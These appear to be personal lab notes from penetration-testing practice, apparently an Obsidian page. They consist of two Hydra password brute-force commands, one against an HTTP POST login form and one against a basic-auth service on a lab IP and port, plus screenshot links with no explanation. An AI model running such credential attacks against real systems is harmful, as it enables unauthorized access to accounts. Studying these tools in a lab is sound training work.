___

```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```


![[Pasted image 20241004131226.png]]

![[Pasted image 20241004131402.png]]

![[Pasted image 20241004131415.png]]

```shell-session
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 83.136.254.47 http-get / -s 52283
```

![[Pasted image 20241004131840.png]]

![[Pasted image 20241004132934.png]]





